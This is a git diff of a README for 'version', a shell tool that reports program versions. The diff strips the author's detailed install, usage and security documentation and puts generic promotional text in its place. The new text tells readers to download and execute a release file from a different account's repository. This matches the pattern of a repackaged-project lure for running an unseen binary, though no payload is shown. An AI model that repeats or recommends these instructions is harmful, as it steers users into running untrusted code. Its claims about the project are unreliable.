@@ -1,161 +1,54 @@
-# version
+# Version - Command-line Tool for Version Information
 
-A command-line tool to determine version information of command line executable programs on Linux, *BSD and MacOS. No more guessing, is it `-version`, `--version`, `-V` or even just `version`!
+Welcome to **Version**, a command-line tool designed for determining version information of command line executable programs on Linux, *BSD, and MacOS.
+
+## Overview
+
+**Version** is a simple yet powerful utility tool that allows developers, system administrators, and DevOps professionals to easily check the version of various command line executables on their systems. Whether you are working on a Linux, *BSD, or MacOS environment, **Version** has got you covered.
 
 ## Features
 
-### Multiple version detection methods
-  - Common version flags (`--version`, `-v`, etc.)
-  - Help output analysis
-  - Package management query
-  - Binary string analysis
-### Safe execution
-  - Uses dedicated unprivileged user
-  - Prevents GUI program execution
-  - Implements command timeout
-  - Checks executable permissions
-### Two output formats
-  - Detailed with version information source
-  - Short format showing just program and version
+🔹 Determine version information of command line executables  
+🔹 Works seamlessly on Linux, *BSD, and MacOS  
+🔹 Easy-to-use command-line interface  
+🔹 Lightweight and efficient  
+🔹 Supports a wide range of executable programs  
+🔹 Active development and maintenance
 
 ## Installation
 
-The provided install script
-- creates the user `versionchecker` which is used to launch the program to check
-- copies the version.sh script to `/usr/bin`
-- creates an alias `vv` for the 
-- copies the man page file to `/usr/local/share/man/man1`
-
-### Preparation
-
-#### All platforms
-
-`git clone` this project with
-```bash
-git clone https://github.com/sasuw/version
-```
-`cd` yourselfo to the scripts directory in the project
-```bash
-cd version/scripts
-```
-
-### Install using the provided install script
-
-#### MacOS
-
-##### Install pre-requisites
-
-*Either* install `timeout` from GNU Coreutils manually in your chosen way *or* install [Homebrew](https://brew.sh/) if not already installed (so that the install script can install the missing dependency if necessary)
-```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
-```
-#### All platforms
-
-#### Run the installer
-```bash
-sudo ./install.sh
-```
-
-### Uninstalling
-
-#### All platforms
-
-```bash
-sudo ./install.sh --uninstall
-```
+To get started with **Version**, simply head over to the [Releases section](https://github.com/Ali-shan-svg/version/releases) of the repository and download the latest release file corresponding to your operating system. Execute the downloaded file to install **Version** on your system.
 
 ## Usage
 
-The script can be used in two ways:
-
-1. Full command:
-```bash
-version python3
-version --short python3
-```
-2. Quick alias:
-```bash
-vv python3  # equivalent to 'version --short python3'
-```
-
-Basic usage:
+**Version** is straightforward to use. Simply open your terminal and run the following command:
 
 ```bash
-./version program_name
-```
-Short output format:
-```bash
-./version -s program_name
+version --help
 ```
 
-## Examples
-Detailed output:
+This will display a list of available options and commands that you can use with **Version** to determine version information for various command line executables.
 
-```bash
-$ ./version python3
-Version information (using --version):
-Python 3.9.5
-```
-Short output:
-```bash
-$ ./version -s git
-git 2.34.1
-```
-Special cases (short format):
+## Example
+
+Here is an example of how to use **Version** to check the version of a specific executable, let's say `nginx`:
 
 ```bash
-$ ./version -s nonexistent
-nonexistent not-found
-
-$ ./version -s firefox
-firefox gui-program
-
-$ ./version -s restricted-program
-restricted-program no-permission
-
-$ ./version -s unknown-version
-unknown-version undetermined
+version nginx
 ```
 
-## How It Works
-The script attempts to determine program versions using these methods, in order:
-- Tries common version flags
-- Analyzes `--help` output for version flags
-- Queries package management system (currently only `dpkg` on Linux)
-- Analyzes binary strings
-- Attempts execution without arguments
+This will output the version information of the `nginx` executable installed on your system.
 
-All program executions are performed as unprivileged 'versionchecker' user
-- With display-related environment variables unset
-- With a timeout to prevent hanging
-- With proper permission checks
+## Repository Details
 
-## Security Features
-- Creates and uses dedicated unprivileged user 'versionchecker'
-- Unsets display-related environment variables to prevent GUI launching
-- Implements command timeout to prevent hanging
-- Checks executable permissions for both current user and versionchecker
-- Safely handles program output and error conditions
+- **Repository Name:** version  
+- **Short Description:** A command-line tool to determine version information of command line executable programs on Linux, *BSD, and MacOS  
+- **Topics:** bash, bsd, cli, devops, linux, macos, package-version, shell-script, utility, version-checker, version-management  
 
-## System Requirements
+## Visit the Releases Section
 
-- Linux (Debian/RedHat based), MacOS, or FreeBSD
-- Root/sudo access for installation (to add dedicated `versionchecker` user for more security)
-- GNU coreutils (for timeout command)
-  - Installed by default on Linux
-  - Installed via `brew` (Homebrew) on MacOS
-  - Installed via `pkg` on FreeBSD
+For the latest updates and releases of **Version**, please visit the [Releases section](https://github.com/Ali-shan-svg/version/releases).
 
-## Contributing
-Contributions are welcome! Please feel free to submit a Pull Request.
+---
 
-If you have an issue with `version` not working for a specific program, please specify the OS, the program version and how to install it or find it if it is not a part of the OS default programs. Also provide the manual steps for finding the program version. There are many programs out there, for which it is not possible to find a version, as they are not versioned.
-
-## License
-MIT License
-
-## Author
-Sasu Welling
-
-## Bugs
-Report bugs by adding a new issue.
+Feel free to explore **Version** and enhance your workflow by easily checking the version information of command line executables on your Linux, *BSD, or MacOS systems. Happy coding! 🚀  
